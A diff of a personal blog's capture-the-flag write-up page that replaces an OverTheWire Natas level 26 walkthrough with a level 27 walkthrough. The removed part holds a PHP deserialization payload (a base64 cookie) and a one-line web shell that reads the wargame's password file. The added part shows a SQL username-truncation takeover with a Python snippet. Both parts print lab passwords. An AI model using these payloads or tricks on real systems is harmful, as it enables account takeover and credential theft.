@@ -5,7 +5,7 @@
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
 	
-	<title>My messy collection  | Natas-Level 26</title>
+	<title>My messy collection  | Natas-Level 27</title>
 	<meta name="viewport" content="width=device-width,minimum-scale=1">
 	<meta name="generator" content="Hugo 0.139.0">
 	
@@ -144,7 +144,7 @@ onload='renderMathInElement(document.body);'></script>
 		<a href="/" title="My messy collection" class="heading font-cursive icon">My messy collection</a>
 	</h2>
 </div>
-<h1 class="pt-2">Natas-Level 26</h1>
+<h1 class="pt-2">Natas-Level 27</h1>
 
 <h3 class="text-java-700 font-normal leading-relaxed pt-2">Writeup</h3>
 
@@ -179,7 +179,7 @@ onload='renderMathInElement(document.body);'></script>
 	
 	
 </div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4"
-		datetime="2024-11-23T13:12:26&#43;02:00">2024-11-23</time>
+		datetime="2024-11-25T16:14:33&#43;02:00">2024-11-25</time>
 </div>
 
 <hr />
@@ -193,173 +193,167 @@ onload='renderMathInElement(document.body);'></script>
 <article>
 	<section class="mx-auto content">
 		<div class="c-rich-text"><h3 id="login">Login</h3>
-<p><em>Username: natas26</em><br>
-<em>Password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE</em><br>
-<em>URL:      <a href="http://natas26.natas.labs.overthewire.org">http://natas26.natas.labs.overthewire.org</a></em></p>
+<p><em>Username: natas27</em><br>
+<em>Password: u3RRffXjysjgwFU6b9xa23i6prmUsYne</em><br>
+<em>URL:      <a href="http://natas27.natas.labs.overthewire.org">http://natas27.natas.labs.overthewire.org</a></em></p>
 <h3 id="doc">Doc</h3>
-<p>Burp Suite is a proprietary software tool for security assessment and penetration testing of web applications. It software was initially developed in 2003-2006 by Dafydd Stuttard to automate his own security testing needs, after realizing the capabilities of automatable web tools like Selenium.
-<a href="https://en.wikipedia.org/wiki/Burp_Suite">Source.</a><br>
-Burp Suite tutorial and usefull guides:<br>
-<a href="https://portswigger.net/burp/documentation/desktop/getting-started">Port Swigger.</a><br>
-<a href="https://www.w3schools.com/php/">PHP tutorial.</a></p>
+<p><a href="https://www.w3schools.com/sql/">SQL tutorial.</a><br>
+<a href="https://stackoverflow.com/questions/8731229/sql-server-string-getting-truncated">SQL string truncation.</a></p>
 <h3 id="solution">Solution</h3>
-<p>The index page presents itself with 4 fields of X`s and Y`s that draw 2 lines from the respective coordinates.</p>
-<img src="/img/natas/natas26-1.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
+<p>The index page has only two fields for the username and password, just like some previous levels.</p>
+<img src="/img/natas/natas27-1.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
 <p><strong>Source code:</strong></p>
 <pre tabindex="0"><code>&lt;?php
-    // sry, this is ugly as hell.
-    // cheers kaliman ;)
-    // - morla
 
-    class Logger{
-        private $logFile;
-        private $initMsg;
-        private $exitMsg;
+// morla / 10111
+// database gets cleared every 5 min
 
-        function __construct($file){
-            // initialise variables
-            $this-&gt;initMsg=&#34;#--session started--#\n&#34;;
-            $this-&gt;exitMsg=&#34;#--session end--#\n&#34;;
-            $this-&gt;logFile = &#34;/tmp/natas26_&#34; . $file . &#34;.log&#34;;
 
-            // write initial message
-            $fd=fopen($this-&gt;logFile,&#34;a+&#34;);
-            fwrite($fd,$this-&gt;initMsg);
-            fclose($fd);
-        }
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
 
-        function log($msg){
-            $fd=fopen($this-&gt;logFile,&#34;a+&#34;);
-            fwrite($fd,$msg.&#34;\n&#34;);
-            fclose($fd);
-        }
 
-        function __destruct(){
-            // write exit message
-            $fd=fopen($this-&gt;logFile,&#34;a+&#34;);
-            fwrite($fd,$this-&gt;exitMsg);
-            fclose($fd);
+function checkCredentials($link,$usr,$pass){
+
+    $user=mysqli_real_escape_string($link, $usr);
+    $password=mysqli_real_escape_string($link, $pass);
+
+    $query = &#34;SELECT username from users where username=&#39;$user&#39; and password=&#39;$password&#39; &#34;;
+    $res = mysqli_query($link, $query);
+    if(mysqli_num_rows($res) &gt; 0){
+        return True;
+    }
+    return False;
+}
+
+
+function validUser($link,$usr){
+
+    $user=mysqli_real_escape_string($link, $usr);
+
+    $query = &#34;SELECT * from users where username=&#39;$user&#39;&#34;;
+    $res = mysqli_query($link, $query);
+    if($res) {
+        if(mysqli_num_rows($res) &gt; 0) {
+            return True;
         }
     }
+    return False;
+}
 
-    function showImage($filename){
-        if(file_exists($filename))
-            echo &#34;&lt;img src=\&#34;$filename\&#34;&gt;&#34;;
-    }
 
-    function drawImage($filename){
-        $img=imagecreatetruecolor(400,300);
-        drawFromUserdata($img);
-        imagepng($img,$filename);
-        imagedestroy($img);
-    }
+function dumpData($link,$usr){
 
-    function drawFromUserdata($img){
-        if( array_key_exists(&#34;x1&#34;, $_GET) &amp;&amp; array_key_exists(&#34;y1&#34;, $_GET) &amp;&amp;
-            array_key_exists(&#34;x2&#34;, $_GET) &amp;&amp; array_key_exists(&#34;y2&#34;, $_GET)){
+    $user=mysqli_real_escape_string($link, trim($usr));
 
-            $color=imagecolorallocate($img,0xff,0x12,0x1c);
-            imageline($img,$_GET[&#34;x1&#34;], $_GET[&#34;y1&#34;],
-                            $_GET[&#34;x2&#34;], $_GET[&#34;y2&#34;], $color);
-        }
-
-        if (array_key_exists(&#34;drawing&#34;, $_COOKIE)){
-            $drawing=unserialize(base64_decode($_COOKIE[&#34;drawing&#34;]));
-            if($drawing)
-                foreach($drawing as $object)
-                    if( array_key_exists(&#34;x1&#34;, $object) &amp;&amp;
-                        array_key_exists(&#34;y1&#34;, $object) &amp;&amp;
-                        array_key_exists(&#34;x2&#34;, $object) &amp;&amp;
-                        array_key_exists(&#34;y2&#34;, $object)){
-
-                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
-                        imageline($img,$object[&#34;x1&#34;],$object[&#34;y1&#34;],
-                                $object[&#34;x2&#34;] ,$object[&#34;y2&#34;] ,$color);
-
-                    }
+    $query = &#34;SELECT * from users where username=&#39;$user&#39;&#34;;
+    $res = mysqli_query($link, $query);
+    if($res) {
+        if(mysqli_num_rows($res) &gt; 0) {
+            while ($row = mysqli_fetch_assoc($res)) {
+                // thanks to Gobo for reporting this bug!
+                //return print_r($row);
+                return print_r($row,true);
+            }
         }
     }
+    return False;
+}
 
-    function storeData(){
-        $new_object=array();
 
-        if(array_key_exists(&#34;x1&#34;, $_GET) &amp;&amp; array_key_exists(&#34;y1&#34;, $_GET) &amp;&amp;
-            array_key_exists(&#34;x2&#34;, $_GET) &amp;&amp; array_key_exists(&#34;y2&#34;, $_GET)){
-            $new_object[&#34;x1&#34;]=$_GET[&#34;x1&#34;];
-            $new_object[&#34;y1&#34;]=$_GET[&#34;y1&#34;];
-            $new_object[&#34;x2&#34;]=$_GET[&#34;x2&#34;];
-            $new_object[&#34;y2&#34;]=$_GET[&#34;y2&#34;];
-        }
+function createUser($link, $usr, $pass){
 
-        if (array_key_exists(&#34;drawing&#34;, $_COOKIE)){
-            $drawing=unserialize(base64_decode($_COOKIE[&#34;drawing&#34;]));
+    if($usr != trim($usr)) {
+        echo &#34;Go away hacker&#34;;
+        return False;
+    }
+    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
+    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));
+
+    $query = &#34;INSERT INTO users (username,password) values (&#39;$user&#39;,&#39;$password&#39;)&#34;;
+    $res = mysqli_query($link, $query);
+    if(mysqli_affected_rows($link) &gt; 0){
+        return True;
+    }
+    return False;
+}
+
+
+if(array_key_exists(&#34;username&#34;, $_REQUEST) and array_key_exists(&#34;password&#34;, $_REQUEST)) {
+    $link = mysqli_connect(&#39;localhost&#39;, &#39;natas27&#39;, &#39;&lt;censored&gt;&#39;);
+    mysqli_select_db($link, &#39;natas27&#39;);
+
+
+    if(validUser($link,$_REQUEST[&#34;username&#34;])) {
+        //user exists, check creds
+        if(checkCredentials($link,$_REQUEST[&#34;username&#34;],$_REQUEST[&#34;password&#34;])){
+            echo &#34;Welcome &#34; . htmlentities($_REQUEST[&#34;username&#34;]) . &#34;!&lt;br&gt;&#34;;
+            echo &#34;Here is your data:&lt;br&gt;&#34;;
+            $data=dumpData($link,$_REQUEST[&#34;username&#34;]);
+            print htmlentities($data);
         }
         else{
-            // create new array
-            $drawing=array();
+            echo &#34;Wrong password for user: &#34; . htmlentities($_REQUEST[&#34;username&#34;]) . &#34;&lt;br&gt;&#34;;
         }
-
-        $drawing[]=$new_object;
-        setcookie(&#34;drawing&#34;,base64_encode(serialize($drawing)));
     }
+    else {
+        //user doesn&#39;t exist
+        if(createUser($link,$_REQUEST[&#34;username&#34;],$_REQUEST[&#34;password&#34;])){
+            echo &#34;User &#34; . htmlentities($_REQUEST[&#34;username&#34;]) . &#34; was created!&#34;;
+        }
+    }
+
+    mysqli_close($link);
+} else {
 ?&gt;
 
-&lt;h1&gt;natas26&lt;/h1&gt;
-&lt;div id=&#34;content&#34;&gt;
-
-Draw a line:&lt;br&gt;
-&lt;form name=&#34;input&#34; method=&#34;get&#34;&gt;
-X1&lt;input type=&#34;text&#34; name=&#34;x1&#34; size=2&gt;
-Y1&lt;input type=&#34;text&#34; name=&#34;y1&#34; size=2&gt;
-X2&lt;input type=&#34;text&#34; name=&#34;x2&#34; size=2&gt;
-Y2&lt;input type=&#34;text&#34; name=&#34;y2&#34; size=2&gt;
-&lt;input type=&#34;submit&#34; value=&#34;DRAW!&#34;&gt;
+&lt;form action=&#34;index.php&#34; method=&#34;POST&#34;&gt;
+Username: &lt;input name=&#34;username&#34;&gt;&lt;br&gt;
+Password: &lt;input name=&#34;password&#34; type=&#34;password&#34;&gt;&lt;br&gt;
+&lt;input type=&#34;submit&#34; value=&#34;login&#34; /&gt;
 &lt;/form&gt;
-
-&lt;?php
-    session_start();
-
-    if (array_key_exists(&#34;drawing&#34;, $_COOKIE) ||
-        (   array_key_exists(&#34;x1&#34;, $_GET) &amp;&amp; array_key_exists(&#34;y1&#34;, $_GET) &amp;&amp;
-            array_key_exists(&#34;x2&#34;, $_GET) &amp;&amp; array_key_exists(&#34;y2&#34;, $_GET))){
-        $imgfile=&#34;img/natas26_&#34; . session_id() .&#34;.png&#34;;
-        drawImage($imgfile);
-        showImage($imgfile);
-        storeData();
-    }
-
-?&gt;
-
+&lt;?php } ?&gt;
 &lt;div id=&#34;viewsource&#34;&gt;&lt;a href=&#34;index-source.html&#34;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;
 &lt;/div&gt;
 &lt;/body&gt;
 &lt;/html&gt;
-</code></pre><p><strong>Important takeaway:</strong></p>
-<p>These are some function that we are gonna utilize in the exploit. The application utilizes a <strong>Logger</strong> class but it is not utilized in any way whatsoever.<br>
-We can see that the drawing cookie is being set by base64 encoding the serialization of the img.<br>
-<strong>setcookie(&ldquo;drawing&rdquo;,base64_encode(serialize($drawing)));</strong></p>
-<h4 id="what-is-serialization-in-php">What is serialization in PHP?</h4>
-<p>Generates a storable representation of a value.<br>
-This is useful for storing or passing PHP values around without losing their type and structure.<br>
-To make the serialized string into a PHP value again, use unserialize().<br>
-<a href="https://www.php.net/manual/en/function.serialize.php">Source.</a></p>
-<h4 id="what-now">What now?</h4>
-<p>We can test this by parsing our default cookie through Cyberchef in reverse order and we should get something tangible.</p>
-<img src="/img/natas/natas26-2.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
-<p>As seen, we get the array representation of the inputed coordinates so in theory, we could reverse the process with whatever value we want for the respective cookie and get a valid running.<br>
-As done before, we can use <strong><? passthru('cat /etc/natas_webpass/natas27'); ?></strong> in a PHP file and then run it by accessing it in the tree at the point where we want to save it.<br>
-So, we are gonna create a PHP file that encodes and serializez a PHP snippet, save it as the cookie and then access the password for the next level.</p>
-<p><strong>Payload code:</strong></p>
-<img src="/img/natas/natas26-3.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
-<p><strong>Run with PHP:</strong></p>
-<pre tabindex="0"><code>02:46:35 archie@Archie pico → php some.php
-Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMToiaW1nL3B3bi5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czoxMDoic29tZXRoaW5nCiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjYxOiI8P3BocCBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOz8+Ijt9
-</code></pre><h4 id="wrapping-up">Wrapping up</h4>
-<p>Now that we`ve got the needed cookie, we can launch burp, modify the current cookie with the modified one in the request and then access the generated php file under the /img directory.</p>
-<img src="/img/natas/natas26-4.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
-<p>After this, let`s check if the PHP file was created.<br>
-Going to /img/pwn2.php in my case reveals the password after running the PHP code.<br>
-<strong>Password for next level:</strong> u3RRffXjysjgwFU6b9xa23i6prmUsYne</p>
+</code></pre><p>This time, the code is not really that interesting and there are no evident exploits. All it does is:</p>
+<ul>
+<li>Create a table with a username and password</li>
+<li>It is stated that the database get`s cleared every 5 mins (not really that relevant)</li>
+<li>The defined fields are of type <strong>VARCHAR 64</strong> (!!! Very important for later)</li>
+<li>If there is a username equivalent with the one you state, you are logging into that user with the password you provide (ofc, only if the password matches with what is stored in the DB)</li>
+<li>Otherwise, the user get`s created into the database with your provided password</li>
+</ul>
+<p>Our goal would logically be to login into <strong>Natas28</strong> in order to get the flag for the next level.<br>
+In order to explore the account creation feature, I`ve created a &ldquo;testuser&rdquo; account with password &ldquo;a&rdquo; and afterwards logged into it in order to see if my query went through succesfully.</p>
+<img src="/img/natas/natas27-2.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
+<img src="/img/natas/natas27-3.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
+<p>Everything worked as expected.<br>
+Even tho the code doesn`t expose any evident flaws, there is an interesting function that holds a clue.<br>
+To be exact :</p>
+<pre tabindex="0"><code>if($usr != trim($usr)) {
+        echo &#34;Go away hacker&#34;;
+        return False;
+    }
+</code></pre><p><strong>trim</strong> — Strip whitespace (or other characters) from the beginning and end of a string. <a href="https://www.php.net/manual/en/function.trim.php">Source.</a><br>
+Why is this important? As seen in the doc section, in SQL, if u exceed the given parameter length, your input get`s truncated.<br>
+For example: if I were to input a string of 64 a`s followed by however many b`s, in the database, the stored value for the username would be 64 a`s.<br>
+Because there is the <strong>Go away hacker</strong> function, we can`t just put a <strong>Natas28</strong> username followed by some whitespaces in order to override the actual <strong>Natas28</strong> credentials, the caviat here being the fact that we can put an exactly 64 characters long <strong>Natas28</strong> username, whitespaces counted too, and follow it up by whatever string we want and the input will be truncated to <strong>Natas28</strong> without triggering the go away function.
+<strong>Python code:</strong></p>
+<pre tabindex="0"><code>username=&#34;natas28&#34; + &#34; &#34;*57+&#34;a&#34;
+with open(&#39;/home/archie/pico/username.txt&#39;, &#39;w&#39;) as file:
+    file.write(username)
+</code></pre><p>This is a simple python snippet that writes to a file a natas28 username followed by 57 whitespaces and an a. I`m goin to use this output as the input for the username on the website and put a password of value &ldquo;test&rdquo;.</p>
+<img src="/img/natas/natas27-4.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
+<p>As you can see, the user creation goes through successfully. Now, all there`s left to do is login with the <strong>natas28</strong> username, <strong>still followed by the 57 whitespaces</strong> and with the chosen password which should override the credentials and grant us the flag.</p>
+<img src="/img/natas/natas27-5.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
+<p>And that`s about it.<br>
+<strong>Password for next level:</strong> 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj</p>
 </div>
 	</section>
 
@@ -469,7 +463,7 @@ Going to /img/pwn2.php in my case reveals the password after running the PHP cod
 	<div class="text-sm text-gray-500 leading-tight a-gray">
 		
 		<br />
-		592 words in this page.
+		739 words in this page.
 	</div>
 </div>
 
@@ -480,21 +474,14 @@ Going to /img/pwn2.php in my case reveals the password after running the PHP cod
 <hr class="double-line" />
 <div class="flex flex-wrap justify-between pb-2 leading-loose font-serif">
     
-    <a class="flex-grow-0" href="/post/socket/">
+    <a class="flex-grow-0" href="/post/natas26/">
         <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
             height="24">
             <path fill="none" d="M0 0h24v24H0z" />
             <path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z" /></svg>
-        Socket
+        Natas-Level 26
     </a>
     
-    
-    <a class="flex-grow-0" href="/post/natas27/">
-        Natas-Level 27
-        <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
-            height="24">
-            <path fill="none" d="M0 0h24v24H0z" />
-            <path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z" /></svg></a>
     
 </div>
 <div >
@@ -504,6 +491,8 @@ Going to /img/pwn2.php in my case reveals the password after running the PHP cod
 <div class="font-serif pb-2 flex align-start leading-loose">
 	<span class="heading pr-6 leading-loose">Related</span>
 	<span >
+		
+			<a href="/post/natas26/">Natas-Level 26</a>&nbsp;&nbsp;&#47;&nbsp;
 		
 			<a href="/post/picoctf3/">dont-you-love-banners</a>&nbsp;&nbsp;&#47;&nbsp;
 		
@@ -531,9 +520,7 @@ Going to /img/pwn2.php in my case reveals the password after running the PHP cod
 		
 			<a href="/post/natas15/">Natas-Level 15</a>&nbsp;&nbsp;&#47;&nbsp;
 		
-			<a href="/post/natas14/">Natas-Level 14</a>&nbsp;&nbsp;&#47;&nbsp;
-		
-			<a href="/post/natas13/">Natas-Level 13</a>
+			<a href="/post/natas14/">Natas-Level 14</a>
 		
 </span>
 </div>
